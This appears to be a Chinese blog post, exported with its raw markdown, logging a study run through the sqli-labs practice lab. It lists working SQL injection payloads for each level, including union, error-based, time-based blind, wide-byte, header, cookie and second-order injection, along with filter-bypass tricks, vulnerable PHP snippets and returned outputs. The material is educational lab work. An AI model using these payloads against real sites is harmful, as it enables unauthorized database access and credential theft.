的内容</br>\n\t此处应该返回id=2 的内容，因为时间上提供服务的是 apache（php）服务器， 返回的数据也应该是 apache 处理的数据。 而在我们实际应用中， 也是有两层服务器的情况， 那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一 个 WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。该用法就 是 HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客 户端都能够造成一定的威胁。 </br>\n\t?id=1&id=-2%27union%20select%201,user(),version()%27</br>\n\t返回:</br>\n  Your Login name:root@localhost</br>\n\tYour Password:5.7.23-0ubuntu0.16.04.1\n\n- **less 30 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web**</br>\n\t?id=1&id=-2%22union%20select%201,user(),version()%22\n\n- **less 31 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web** </br>\n\t?id=1&id=-2\")union%20select%201,user(),version()%23\n\n- **less 32 GET - Bypass Custom Filter Adding Slashes to Dangerous Chars**</br>\n宽字节注入</br>\n\t原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \\’ （转换的函数或者思路会在每一关遇到的时候介绍）。 因此我们在此想办法将 ‘ 前面添加的 \\ 除掉。</br>\n  一般有两种思路： </br>\n\t1、%df 吃掉 \\ 具体的原因是 urlencode(‘\\) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27， 而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此 事%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 同时也就达到了我们的目的。</br>\n\t2、将 \\’ 中的 \\ 过滤掉， 例如可以构造 %\\**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法。</br>\n\n\taddslashes() 函数返回在预定义字符之前添加反斜杠的字符串，预定义字符为：'   \"  \\</br>\n\taddslashes()并未将反斜杠一起写入数据库，只是帮助mysql完成了sql语句的执行\n  \tfunction check_addslashes($string)\n  \t{\n  \t\t$string= addslashes($string);    \n  \t\treturn $string;\n  \t}\n\t例?id=-1%27%20union%20select%201,version(),user()%20%27</br>\n\tThe filtered request is :-1\\' union select 1,version(),user() \\'</br>\n\n\t?id=-1%df%27%20union%20select%201,version(),user()%23</br>\n\t返回:</br>\n  Your Login name:5.7.23-0ubuntu0.16.04.1</br>\n\tYour Password:root@localhost\n\n- **less 33 GET -  Bypass AddSlashers()**</br>\n\t?id=-1%df%27%20union%20select%201,version(),user()%23和less32一样\n\n- **less 34 POST - Bypass AddSlashers()**</br>\n\tpost型的方式我们是以url形式 提交的，因此数据会通过URLencode，如何将方法用在post型的注入当中，我们此处介绍 一个新的方法。将utf-8转换为utf-16或utf-32，例如将‘转为utf-16为' 。我们就 可以利用这个方式进行尝试。</br>\n\n\t運' or 1=1 # 成功，猜测: 在后台運会被解析成%df%5c </br>\n\tSELECT username, password FROM users WHERE username='運\\' or 1=1# ' and password='' LIMIT 0,1\n\n- **less 35 GET - Bypass Add Slashes(we dont need them) Integer Based**</br>\n\tphp中：$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";</br>\n\t可以看出，不需要构造特殊符号</br>\n\t?id=-1%20union%20select%201,version(),user()%23</br>\n\n- **less 36 GET - Bypass mysql_real _escape _string**</br>\n\tmysql_real_escape_string(string,connection) 转义 SQL 语句中使用的字符串中的特殊字符</br>\n\tstring 必需，要转义的字符串</br>\n\tconnection 可选，规定 MySQL 连接。如果未规定，则使用上一个连接</br>\n  \t\\x00  ascii码 null\n  \t\\n\t换行\n  \t\\r\t回车\n  \t\\\n  \t'\n  \t\"\n  \t\\x1a （即十进制26）&\n\t这些字符会被转义</br>\n\n  \tfunction check_quotes($string)\n  \t{\n  \t\t$string= mysql_real_escape_string($string);    \n  \t\treturn $string;\n  \t}\n  \t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n\n\t?id=-1%df%27%20union%20select%201,version(),user()%23 成功\n\n- **less 37 POST - Bypass mysql_real_escape_string** </br>\n\t運' or 1=1 #\n\n---------------------------------------------------\n\nStacked injections:堆叠注入。从名词的含义就可以看到应该是一堆 sql 语句（多条）一起执 行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结 尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。 </br>\n原理:</br>\n在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句， 会不会一起执行？因此这个想法也就造就了堆叠注入。 而 union injection （联合注入） 也是将两条语句合并在一起， 两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的， 可以用来执行查询语句， 而堆叠注入可以执行的是 任意的语句。 </br>\n局限:</br>\n堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎 不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。 </br>\n虽然我们前面提到了堆叠查询可以执行任意的 sql 语句，但是这种注入方式并不是十分 的完美的。在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。\n因此，在读取数据时，我们建议使用 union（联合）注入。同时在使用堆叠注入之前， 我们也是需要知道一些数据库相关信息的，例如表名，列名等信息</br>\n\n暂不深入了解\n\n---------------------------------------------\nchallenge\n\n- **GET - challenge - Union -10 Queries Allowed - Variation1**</br>\n\t1.查表名</br>\n\t?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23</br>\n\t得到此次的表名: 8TELU525VO</br>\n\t2.查列名 用concat一次性查完输出</br>\n\t?id=-1%27%20union%20select%201,(select%20group_concat(column_name ,%22---%22)%20from%20information_schema.columns%20where%20table_name%3d%228TELU525VO%22),3%20%23</br>\n\t返回:</br>\n  Your Login name:id---,sessid---,secret_63JY---,tryy---</br>\n\tYour Password:3</br>\n\t3.得到密码id,sessid,secret_63JY</br>\n\t?id=-1%27%20union%20select%20id,sessid,secret_63JY%20from%208TELU525VO%20%23</br>\n\t返回:</br>\n  Your Login name:856213ca887976a33e3d91b2c61fa65a</br>\n\tYour Password:M5ztHsC34iN2X0lzCiXJ27Cp</br>\n\t4.输入 M5ztHsC34iN2X0lzCiXJ27Cp 完成\n\n- **GET - Challenge - Union - 14 Queries Allowed - Variation 2**</br>\n\t1.猜测过滤规则</br>\n\t当输入?id=1)%26%26(1=1 时 成功 可知过滤为()</br>\n\t2.参考less 54</br>\n\t?id=-1)%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23</br>\n\t表名为: C73JPUKYS9\t</br>\n\t?id=-1)%20union%20select%201,(select%20group_concat(column_name ,%22---%22)%20from%20information_schema.columns%20where%20table_name%3d\n\t%22C73JPUKYS9%22),3%20%23</br>\n\t列名: Your Login name:id---,sessid---,secret_DH0J---,tryy---</br>\n\t?id=-1)%20union%20select%20id,sessid,secret_DH0J%20from%20C73JPUKYS9%20%23</br>\n\t密码：</br>\n  Your Login name: 4d0218b33a232f675d53381ef38b5370</br>\n  Your Password: kjbKG19I62vmYE3kS7gGN7qf </br> 成功\n\n- **GET - Challenge - Union - 14 Queries Allowed - Variation 3**</br>\n\t1.猜测</br>\n\t?id=1%27)%26%26(%271=1 成功 可知为(' ')</br>\n\t2.下面步骤如上</br>\n\n- **GET - Challenge - Union - 14 Queries Allowed - Variation 4**</br>\n\t如上\n\n- **GET - Challenge - Double Query -5 Queries Allowed - Variation 1**</br>\n\t1.猜测</br>\n\t?id=1%27%26%26%271=1 成功，可知为' '</br>\n\t?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23 </br>  返回同上，可知有其它过滤规则</br>\n\t尝试报错注入</br>\n\t?id=-1%27%20union%20select%20updatexml(1,concat(0x7e,version(),0x7e),1)%23 成功返回version()</br>\n\t2.获取表名</br>\n\t?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),0x7e),1),1%23</br>\n\t返回：XPATH syntax error: '~4HT916R6T1~'</br>\n\t3.获取列名</br>\n\t?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20group_concat(column_name%20,\"---\")%20from%20information_schema.columns%20where%20table_name%3d%20\"4HT916R6T1\"),0x7e),1),1%23</br>\n\t返回: XPATH syntax error: '~id---,sessid---,secret_EN0R---,'为什么有一个列没显示</br>\n\t4.获取密码</br>\n\t?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20secret_EN0R%20from%204HT916R6T1),0x7e),1),1%23</br>\n\t返回: XPATH syntax error: '~OcDGOovBkd3XMq3FpuSNtEIN~'</br>\n\n- **GET - Challenge - Double Query -5 Queries Allowed - Variation 2**</br>\n\t?id=1%26%261=1 返回成功，说明无字符</br>\n\t剩余步骤如 less 58</br>\n\n-  **GET - Challenge - Double Query -5 Queries Allowed - Variation 3**\n\t?id=1%22%26%26%221=1 猜测为 \" \"</br>\n?id=1%22)%26%26(%221=1 猜测为(\" \") </br>\n都返回相同结果？？？？</br>\n  但实际上\n        \t$id = '(\"'.$id.'\")';\n  \t\t\t$sql=\"SELECT * FROM security.users WHERE id=$id LIMIT 0,1\";\n  \t           if($row)\n  \t\t\t\t{\n  \t\t\t\t\techo '<font color= \"#00FFFF\">';\n  \t\t\t\t\t$unames=array(\"Dumb\",\"Angelina\",\"Dummy\",\"secure\",\"stupid\",\"superman\",\"batman\",\"admin\",\"admin1\",\"admin2\",\"admin3\",\"dhakkan\",\"admin4\");\n  \t\t\t\t\t$pass = array_reverse($unames);\n  \t\t\t\t\techo 'Your Login name : '. $unames[$row['id']];\n  \t\t\t\t\techo \"<br>\";\n  \t\t\t\t\techo 'Your Password : ' .$pass[$row['id']];\n  \t\t\t\t\techo \"</font>\";\n  \t\t\t\t}\n  \t\t\t\telse\n  \t\t\t\t{\n  \t\t\t\t\techo '<font color= \"#FFFF00\">';\n  \t\t\t\t\tprint_r(mysql_error());\n  \t\t\t\t\techo \"</font>\";  \n  \t\t\t\t}\n\t每次返回都是$unames=array（），奸诈！！\n\n- **GET - Challenge - Double Query -5 Queries Allowed - Variation 4**</br>\n\t$sql=\"SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1\";\n\n- **GET - Challenge - Blind -130 Queries Allowed - Variation 1**</br>\n\t盲注了,该写脚本了，boolean或者延时,注意使用二分提高效率</br>\n\t?id=1%27)and If(ascii(substr((select group_concat(tabl e_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%2 7),1,1))=79,0,sleep(10))--+\n\n### 三.杂记\n\n- 盲注</br>\n\t语句执行完后没有回显</br>\n\t1.基于布尔</br>\n\t构造条件，有无界面显示来判断自己构造的消息是否正确（相当于猜测再验证，可以利用二分法提高效率）</br>\n\t2.基于报错</br>\n\tSELECT COUNT(SCHEMA_NAME) FROM information_schema.SCHEMATA GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)\\*2));</br>\n\t[Err] 1062 - Duplicate entry '5.7.23-0ubuntu0.16.04.11' for key '<group_key>'</br>\n\t具体原理不懂，concat, floor, group by，rand(0)是关键</br>\n\t如果rand被禁用可以使用用户变量来报错？？</br>\n\t或者XPath报错等</br>\n\t3.基于时间-延迟注入</br>\n\t利用if,当条件正确或错误时，确定要不要sleep()来猜测</br>\n\n- insert/update/delete注入</br>\n\t思路：利用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显</br>\n\n-\torder by</br>\n\t可以用来确定有几列，如 order by 4 ,报错没有第四列</br>\n\n- url编码\n  \t空格    -    %20\n  \t\"          -    %22\n  \t#         -    %23\n  \t%        -    %25\n  \t&         -    %26\n  \t(          -    %28\n  \t)          -    %29\n  \t+         -    %2B\n  \t,          -    %2C 逗号\n  \t/          -    %2F\n  \t:          -    %3A\n  \t;          -    %3B\n  \t<         -    %3C\n  \t=         -    %3D\n  \t>         -    %3E\n  \t?         -    %3F\n  \t@       -    %40\n  \t\\          -    %5C\n  \t|          -    %7C\n  \t'               %27  单引号\n\n- 补充一些数据库知识</br>\n  \tinfomation_shema这个数据库中保存了mysql服务器中的所有数据库信息。\n  \t如数据库名，数据库的表，表栏的数据类型与访问权限等。</br>\n  \t再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，\n  \t每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。</br>\n\n  \tinformation_schema的表schemata中的列schema_name记录了所有数据库的名字\n  \tinformation_schema的表tables中的列table_schema记录了所有数据库的名字\n  \tinformation_schema的表tables中的列table_name记录了所有数据库的表的名字\n  \tinformation_schema的表columns中的列table_schema记录了所有数据库的名字\n  \tinformation_schema的表columns中的列table_name记录了所有数据库的表的名字\n  \tinformation_schema的表columns中的列column_name记录了所有数据库的表的列的名字\n查询指定数据库所有表名</br>\nSELECT table_name FROM information_schema.tables WHERE table_schema='数据库名';</br>\n查询mysql中所有数据库名字</br>\nSELECT schema_name FROM information_schema.schemata</br>\n\n\tversion()  mysql版本\n\tuser()用户\n\t@@datadir数据路径\n\t@@version_compile_os 操作系统\n\tdatabase() 数据库名字\n\tSELECT VERSION(), USER(), @@datadir, @@version_compile_os, DATABASE();\n--+/# 注释，一般用#，url编码为%23</br></br>\nmysql中XPath:</br>\nMySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</br>\nExtractValue():</br>\n\tEXTRACTVALUE (XML_document, XPath_string); </br>\n\t第一个参数：XML_document是String格式，为XML文档对象的名称</br>\n\t第二个参数：XPath_string (Xpath格式的字符串) </br>\n\t作用：从目标XML中返回包含所查询值的字符串</br>\nUpdateXml():</br>\n\tUPDATEXML (XML_document, XPath_string, new_value); </br>\n\t第一个参数：XML_document是String格式，为XML文档对象的名称</br>\n\t第二个参数：XPath_string (Xpath格式的字符串) </br>\n\t第三个参数：new_value，String格式，替换查找到的符合条件的数据 </br>\n\t作用：改变文档中符合条件的节点的值 </br>\n通常利用其显错来进行注入，例 updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</br>\n0x7E为~的ascii码</br></br>\nif</br>\nIF(expr1,expr2,expr3) 如果expr1为true返回expr2,否则返回expr3</br></br>\nconcat() 连接字符串，将多个连接在一起。</br>\n\tconcat(str1,str2,...)</br>\nconcat_ws() 将多个字符串连接在一起，可以一次性指定分隔符</br>\n\tconcat_ws(sparator, str1,str2,...)</br>\ngroup_concat() 将group by产生的同一个分组中的值连接起来，返回一个字符串结果</br>\n\tgroup_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator '分隔符'] )</br>\n\n\n\n\n\n- 问题：</br>\n1.怎么确定是哪种注入类型？</br>\n2.在没有返回值的情况下判断单引号双引号括号等\n\n- 其它\n  \t?id=1%27%26%26%271=1 猜测为’ ‘\n  \t?id=1%27)%26%26(%271=1 猜测为（’ ‘）\n  \t?id=1%22%26%26%221=1 猜测为 \" \"\n  \t?id=1%22)%26%26(%221=1 猜测为(\" \")\n  \t?id=1)%26%26(1=1  猜测为()\n  \t?id=1%26%261=1 无\n","source":"_posts/security/sql/sql注入.md","raw":"---\ntitle: sql-labs注入\ndate: 2018-08-28 11:30:20\ntags: [security]\n---\n## SQL注入\nsql注入:利用现有程序，使之执行构造的payload.\n\n### 一. 环境搭建\n- ubuntu16.04虚拟机\n- 更新阿里源 apt-get update\n- 安装mysql apt-get install mysql-server mysql-client -y\n- 安装apache apt-get install apache2 -y\n- 安装git apt-get install git -y\n- 项目 cd /var/www && sudo git clone https://github.com/Audi-1/sqli-labs.git sqli-labs  \n- 更改项目的mysql配置文件为自己数据库\n- 现在在浏览器localhost/sqli-labs已经可以访问到了\n\n##### 问题\n- navicat连不上mysql </br>\n\t注释 /etc/mysql/mysql.cnf.d/mysqld.cnf 中bind 127.0.0.1</br>\n\t修改select user, host from user;  update user set host = \"%\" where host = 'localhost';  flush privileges;\n- php版本导致mysql_connect()废弃 </br>\n\t安装phpstorm 配置phpcgi  apt-get install php版本-cgi</br>\n\t降低版本到php5.6错误仍然在</br>\n\t第二天重启Phpstrom 打开网页，错误消失</br>\n  猜测是降低版本有效，但第一天有缓存</br>\n<!-- more -->\n### 二.sqli-labs\n参考了大牛的教程https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf\n\n- ** less1 GET-Error based - Single quotes - String </br> **\n\tphp中代码 SELECT * FROM users WHERE id='$id' LIMIT 0,1;\n\t%20 空格 %27 单引号 %3D 等于号</br>\n\t一：?id=(select%20id%20from%20users%20where%20username%20%3D\"admin\") 未成功  \t’$id' 注入被单引号包裹，将输入变成了字符串</br>\n\t二：?id='%20and%20username%3D%27admin 未成功 id=''这个条件未绕过\n\t想利用id=这个条件或者绕过这个条件</br>\n\t三：?id='%20or%20username%3D%27admin 成功</br>\n\t基于二，转换思路，利用or成功绕过</br>\n\t爆破数据库版本</br>\n\t?id=-1%27%20%20union%20select%201%2cversion()%2c3%23</br>\n\t？id=-1'  union select 1,version(),3#</br>\n\tunion必须列一样，所以1和3是为了保持三列\n\n- ** less 2 GET - Error based -Intiger based</br> **\n\tphp中代码 $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";</br>\n\t$id未加引号过滤输入</br> ?id=(select%20id%20from%20users%20where%20username%20%3D\"admin\")成功注入\n\n- ** less 3 GET - Error based - single quotes with twist - string**</br>\n\tphp中代码 $sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\"; 用括号和单引号进行了过滤</br>\n\t思路：消除括号</br>\n\t?id=%27)or%20username%3D%27admin%27or%20(%27  成功\n\n\n- ** less 4  GET - Error based - Double Quotes - String ** </br>\n\tphp中代码</br>\n\t$id = '\"' . $id . '\"';</br>\n\t$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";</br>\n\t?id=%27)or%20username%3D%27admin%27or%20(%27 成功</br>\n\n    关于前四个less的一些心得：\n    \t1.找错误：\n    \t\t尝试着单引号，双引号，括号等特殊字符注入，如果有报错信息，多半就是该符号出问题\n    \t\t例：?id=\"\n    \t\t\t\t 返回You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"\"\") LIMIT 0,1' at line 1\n    \t\t\t可以看出输入所在位置为（“输入”）\n    \t2.注入利用\n    \t\t通过union来执行自己想要的sql\n\n- ** less 5  GET - Double Injection - Single Quotes - String ** </br>\n双查询注入（双查询：select嵌套select）</br>\n\t输入?id=‘ 失败， use near 1  由此猜测为单引号</br>\n\t?id='%20or%20username%3D%27admin 成功 </br>\n\t但是sql执行结果前端并没有进行输出，怎么利用？</br>\n\n\t查询资料后发现：Double injection 双注入。一些研究人员发现，使用group by子句结合rand()函数以及像count（\\*）这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的，这就产生了双重查询注入。</br>\n\t发现多查询几次会爆出duplicate entry的错误，且将我们需要的信息都爆出来了。（正常结果未返回显示，所以通过错误信息去获得我们想要的信息，有随机性，需要重复多次）</br>\n\tcount() 计数</br>\n\trand() 随机</br>\n\tgroup by 分组</br>\n\tfloor() 向下取整，舍弃小数部分</br>\n\n\t?id=-1%27%20union%20select%201%2c(select%20count(\\*)%20from%20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)\\*2)))%2c3%20%23 成功</br>\n\tDuplicate entry '5.7.23-0ubuntu0.16.04.11' for key ''\n\t其中version(）是我们希望执行的函数，可以换成其它\n\n- ** less 6 GET - Double Injection - Double Quotes - String ** </br>\n\n\t?id=-1%22%20union%20select%201%2c(select%20count(\\*)%20from%\t\t20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)\\*2)))%2c3%20%23 成功\n\n- ** less 7 GET - Dump into outfile - String ** </br>\n\t文件导入限制条件多，未成功\n\n- ** less 8 GET - Blind - Boolian Based - Single Quotes ** </br>\n\t?id=-1%27or%201%3d1%23 </br>\n\t利用二分与返回结果的正确与否，来猜测验证数据库内容\n\n- ** less 9 GET - Blind - Time Based - Single Quotes ** </br>\n\t?id=1%27%20and%20if(ascii(substr(database(),1,1))>116,%200,%20sleep(5))%20%23 </br>\n\t因为在这正确或者错误都是返回的\"you are in\" 所以不能区分 </br>\n  ![youarein](./youarein.png)\n\t使用时间延迟，例子为判断数据库名字第一个字是否为s(ascii码为115)，要进行多次尝试\n\n- ** less 10 GET -Blind - Time Based - Double Quotes ** </br>\n\t?id=1\"%20and%20if(ascii(substr(database(),1,1))>116,%200,%20sleep(5))%20%23\n\n- ** less 11 POST - Error Based -Single Qoutes - String ** </br>\n\tusername:  \n      1.admin ' # admin用户</br>\n      2.adimn ' or 1=1 # 万能</br>\n      3. ' union select version(),1 # 等其它操作\n\tpasswd:\n    因为username已经用#将后面注释了，所以passwd随意输入\n\n- ** less 12 POST - Error Based - Double Quotes - String - with twist ** </br>\n将less11的单引号改为 “）\n\n- ** less 13 POST - Double Injection - Single quotes - String - with twist ** </br>\n\tusername:    ') union select (select count(\\*) from information_schema.schemata group by concat(version(),floor(rand(0)\\*2))),1 #</br>\n\t返回信息Duplicate entry '5.7.23-0ubuntu0.16.04.11' for key ''</br>\n\t另外这种有正确/错误提示的，都可以二分盲注来猜测验证\n\n- ** less 14 POST  - Double Injection - Double quotes - String ** </br>\n\tless13 ') 换为 ”\n\n- ** less 15 POST - Blind - Boolean/Time Based -Single Quotes ** </br>\n\tusername: ' or 1=1 # 登录成功 </br>\n\t思路：利用or/and/if sleep()等来进行猜测</br>\n\n- ** less 16 POST - Blind - Boolean/Time Based - Double Quotes - with twist ** </br>\n\t将less15 ' 换成 \")\n\n- ** less 17 POST - Update Query - Error Based - String ** </br>\n\t这里对用户名进行了过滤</br>\n\t利用报错进行注入输出 </br>\n\tuname=admin&passwd=11'and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&sub mit=Submit </br>\n\t输出结果XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1~'</br>\n  报错注入基本都是利用XPath进行报错\n\t有必要去买本书来系统的看一下mysql各种函数\n\n- ** less 18 POST - Header Injection - Uagent field - Error Based ** </br>\n\t这里需要正确的账号密码才能进行注入，因为插入操作是在登录判断成功后</br>\n\tphp中语句：$insert=\"INSERT INTO \\`security\\`.\\`uagents\\` (\\`uagent\\`, \\`ip_address\\`, \\`username\\`) VALUES ('$uagent', '$IP', $uname)\";</br>其中$IP不好修改，$uname与$password进行了过滤，所以考虑$uagent</br>\n\t将User-Agent 修改为 ‘ or extractvalue(1,concat(0x7e,version())) or ’</br>\n\t返回结果：XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1'\n\n- ** less 19 POST - Header Injection - Referer Field - Error Based ** </br>\n\t同less 18,进行了过滤，但执行了$insert=\"INSERT INTO \\`security\\`.\\`referers\\` (\\`referer\\`, \\`ip_address\\`) VALUES ('$uagent', '$IP')\";</br>\n\t其中：$uagent = $\\_SERVER['HTTP_REFERER'];</br>\n\t将Referer 修改为: 'or extractvalue(1,concat(0x7e,database())) or'</br>\n\t返回: XPATH syntax error: '~security'\n\n- ** less 20 POST - Cookie Injection - Uagent Field - Error Based ** </br>\n\t进行了过滤</br>\n\t$cookee = $\\_COOKIE['uname'];</br>\n\t$sql=\"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\";</br>\n\t流程是登录成功后产生cookie,此时修改cookie,进行注入(在chrome浏览器中使用tamper插件进行请求的拦截修改)</br>\n\t修改Cookie为： uname=-1' union select 1,(select version()),3 #</br>\n\t返回 ：\n           Your Login name:5.7.23-0ubuntu0.16.04.1\n\t\t   Your Password:3\n\t\t   Your ID:1\n\t也可以用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显</br>\n\t uname=admin'and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# </br>\n\t返回:Issue with your mysql: XPATH syntax error: '~/usr/~'\n\n- ** less 21 POST - Cookie Injection - Error Based - Base64 Encode - Single Quotes - String ** </br>\n\tsetcookie('uname', base64_encode($row1['username']), time()+3600);\n\t$sql=\"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1\";</br>\n\t对Cookie 进行了 base64处理 </br>\n\tuname=LTEnKSB1bmlvbiBzZWxlY3QgMSwoc2VsZWN0IHZlcnNpb24oKSksMyAj\n\tuname=-1') union select 1,(select version()),3 #</br>\n\t返回：</br>\n  Your Login name:5.7.23-0ubuntu0.16.04.1</br>\n\t Your Password:3</br>\n\tYour ID:1\n\n- ** less 22 POST - Cookie Injection - Error Based - Base64 Encode - Double Quotes - String ** </br>\n\t对Cookie进行了base64编码，使用的双引号\n\n----------------------------------------------------------------------\n\n- ** less 23 GET - Error Based - Strip Comments ** </br>\n\tphp中处理：</br>\n\t$reg = \"/#/\";</br>\n\t$reg1 = \"/--/\";</br>\n\t$replace = \"\";</br>\n\t$id = preg_replace($reg, $replace, $id); //将$reg替换为$replace</br>\n\t$id = preg_replace($reg1, $replace, $id);</br>\n\t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";</br>\n\t因为过滤了注释符号，所以自己添加引号来闭合,同样可以使用报错/延时注入等</br>\n\t?id=-1%27%20union%20select%201%2c(select%20version())%2c3%20%27</br>\n\t返回：</br>\n  Your Login name:5.7.23-0ubuntu0.16.04.1</br>\n\tYour Password:3\n\n- ** less 24 POST - Second Order Injection \\*Real treat\\* - Stored Injections ** </br>\n\t本关为二次注入的示范例。二次注入也称为存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中， 当再次调用这个恶意构造的字符时， 就可以触发 sql 注入</br>\n\tphp中:</br>\n      $sql = \"select count(\\*) from users where username='$username'\";\n\t\t  $res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');\n\t\t  $sql = \"insert into users ( username, password) values(\\\"$username\\\", \\\"$pass\\\")\";\n\t\t  $sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \";\n\t先注册一个admin'#用户，更改其密码，实际上是更改的admin的密码\n\n- **less 25 GET - Error Based - All your OR & AND Belong to us - String - Single Quotes**</br>\n\t$id= preg_replace('/or/i',\"\", $id);\t\t\t//strip out OR (non case sensitive)</br>\n\t$id= preg_replace('/AND/i',\"\", $id);\t\t//Strip out AND (non case sensitive)</br>\n\t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";</br>\n\t思路：使用union\n\t绕过过滤：\n        （1）大小写变形 Or,OR,oR\n\t\t（2）编码，hex，urlencode\n\t\t（3）添加注释/*or*/\n\t\t（4）利用符号 and=&& or=||\n\t?id=1%27%20||%20%20extractvalue(1%2cconcat(0x7e%2cversion()))%23\n\t返回：XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1'\n\n- **less 25a GET - Blind Based - All your OR & AND Belong to us - String - Single Quotes** </br>\n\t$id= blacklist($id);</br>\n\t$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";</br>\n\t//print_r(mysql_error()); </br>\n\t报错注入不能用，所以使用基于布尔的注入，其中and/or进行了过滤</br>\n\t?id=-1%20||%20if(ascii(substr(database(),1,1))%3d117,0,1)判断数据库名字第一个字符是不是u(users库)</br>\n  然后依次这样，查出数据库名\n\n- **less 26 GETs - Error Based - All your Spaces and Comments Belong to us** </br>\n\tComments 注释</br>\n\tphp中:</br>\n\t   function blacklist($id)\n\t    {\n\t\t$id= preg_replace('/or/i',\"\", $id);\t\t\t//strip out OR (non case sensitive)\n\t\t$id= preg_replace('/and/i',\"\", $id);\t\t//Strip out AND (non case sensitive)\n\t\t$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//strip out /*\n\t\t$id= preg_replace('/[--]/',\"\", $id);\t\t//Strip out --\n\t\t$id= preg_replace('/[#]/',\"\", $id);\t\t\t//Strip out #\n\t\t$id= preg_replace('/[\\s]/',\"\", $id);\t\t//Strip out spaces\n\t\t$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id);\t\t//Strip out slashes\n\t\treturn $id;\n\t   }\n\t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";</br>\n\t思路：</br>\n  注释过滤了可以手动闭合引号，空格过滤\n\t可以使用  %a0  换行，</br>\n  /\\**/ 注释， （） 括号等绕过空格</br>\n\t此处注释不能使用，为了使用select时去掉末尾引号，空格也不行</br>\n\tid='111'union(select(1),(version()),(3)） ' LIMIT 0,1; 使用括号时，引号还在</br>\n\t?id=111%27union%a0select%a01%2cversion()%2c3||%271使用换行成功\n\n- **less 26a  GET - Blind Based - All your SPACES And COMMENTS Belong to us - Quotes-Parenthesis** </br>\n\t过滤和less26相同</br>\n\t$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";</br>\n\t?id=111%27)union%a0select%a01%2cversion()%2c3||(%271</br>\n\n\t思考：在盲注时，我们不知道进行了哪些过滤，可以构造特殊payload,如果返回原结果，则说明是我们所猜测的 %26为&</br>\n\t?id=1%27%26%26%271=1 猜测为’ ‘</br>\n\t?id=1%27)%26%26(%271=1 猜测为（’ ‘）</br>\n\t?id=1%22%26%26%221=1 猜测为 \" \"</br>\n\t?id=1%22)%26%26(%221=1 猜测为(\" \")</br>\n\t?id=1)%26%26(1=1  猜测为()</br>\n\t?id=1%26%261=1 无</br>\n等诸如此类</br>\n\n- **less 27 GET - Error Based - All your UNION & SELECT Belong to us - String - Single Quotes**</br>\n  \tfunction blacklist($id)\n  \t{\n  \t$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//strip out /*\n  \t$id= 